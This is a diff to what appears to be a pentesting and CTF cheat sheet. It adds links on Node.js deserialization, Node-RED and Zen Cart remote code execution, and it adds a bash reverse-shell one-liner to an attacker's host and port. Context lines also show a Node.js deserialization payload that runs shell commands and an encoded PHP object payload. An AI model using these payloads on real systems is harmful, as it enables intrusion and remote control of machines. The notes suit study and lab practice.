@@ -444,7 +444,8 @@ https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
 > To learn more about Node JS navigate to https://www.youtube.com/watch?v=W6NZfCO5SIk, thanks to frostb1te for providing the link.
 
 ### NodeJS deserialization RCE Exploit
-https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf
+https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf  
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  
 
 ```
 _$$ND_FUNC$$_require('child_process').exec('<COMMAND_HERE>', function(error, stdout, stderr) { console.log(stdout) })
@@ -651,3 +652,15 @@ if(isset($perm) && $perm->is_admin()){
 
 `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`
 
+### NodeRed Exploit
+https://csenox.github.io/hackthebox-linux/2020/10/07/HTB-Reddish/  
+https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/  
+
+After getting foothold stabilize your connection by reverse tcp via bash:
+
+```
+bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
+```
+
+### Zen Cart RCE (Authenticated)
+https://github.com/MucahitSaratar/zencart_auth_rce_poc  
